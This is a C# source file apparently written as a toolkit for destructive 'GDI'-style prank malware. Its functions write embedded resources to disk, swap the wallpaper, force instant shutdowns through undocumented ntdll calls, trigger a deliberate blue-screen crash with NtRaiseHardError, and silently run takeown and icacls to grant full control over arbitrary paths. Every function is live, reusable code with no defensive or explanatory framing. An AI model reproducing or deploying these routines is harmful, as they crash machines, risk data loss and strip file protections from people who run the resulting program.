using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace gdifuncs
{
    public static class functions
    {
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }
        [STAThread]

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern bool SystemParametersInfo(uint uAction, uint uParam, string lpvParam, uint fuWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x0014;
        private const uint SPIF_UPDATEINIFILE = 1;
        private const uint SPIF_SENDWININICHANGE = 2;
        public static void ChangeWallpaper(string path)
        {
            Thread.Sleep(2000);
            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE))
            {
                MessageBox.Show("failed", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            return;
        }
        public static bool IsAdministrator()
        {
            System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege,
bool IsThreadPrivilege, out bool PreviousValue);
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ExitWindowsEx(int uFlags, int dwReason);
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtShutdownSystem(int powerstate);
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtSetSystemPowerState(int psState, int StateFlags, int Options);
        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(
           uint ErrorStatus,
           uint NumberOfParameters,
           uint UnicodeStringParameterMask,
           IntPtr Parameters,
           uint ValidResponseOption,
           out uint Response
       );

        private static uint STATUS_ASSERTION_FAILURE = 0xC0000420;

        public static void Reboot()
        {
            bool bUnused;
            RtlAdjustPrivilege(19 /* SeShutdownPrivilege */, true, false, out bUnused);
            NtSetSystemPowerState(6, 6, 0x00010000 | 0x0000000a);
            NtShutdownSystem(1);
            ExitWindowsEx(0x00000002, 0x00000004);
        }
        public static void Restart()
        {
            Process proc = new Process();
            proc.StartInfo.FileName = "C:\\Windows\\System32\\shutdown.exe";
            proc.StartInfo.Arguments = "/r /t 00";
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Start();
        }
        public static void BSOD()
        {
            RtlAdjustPrivilege(19, true, false, out bool previousValue);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);
        }
        public static bool CheckWindowsXP()
        {
            OperatingSystem os = Environment.OSVersion;
            if (os.Platform == PlatformID.Win32NT)
            {
                if (os.Version.Major < 6)
                    return true;
                else
                    return false;
            }
            else
                return false;
        }
        public static void TakeOwnerShip(string path)
        {
            Process proc = new Process();
            if (IsAdministrator() == true)
            {
                if (CheckWindowsXP() == false)
                {
                    proc.StartInfo.Verb = "RunAs";
                }
            }
            proc.StartInfo.FileName = "C:\\Windows\\System32\\takeown.exe";
            proc.StartInfo.Arguments = "/F " + "\"" + path + "\"";
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Start();
            proc.WaitForExit();
            return;
        }
        public static void icacls(string path, string Owner)
        {
            Process proc = new Process();
            if (IsAdministrator() == true)
            {
                if (CheckWindowsXP() == false)
                {
                    proc.StartInfo.Verb = "RunAs";
                }
            }
            proc.StartInfo.FileName = "C:\\Windows\\System32\\icacls.exe";
            proc.StartInfo.Arguments = "\"" + path + "\"" + " /grant " + "\"" + Owner + "\"" + ":F /T";
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Start();
            proc.WaitForExit();
            return;
        }
    }
}
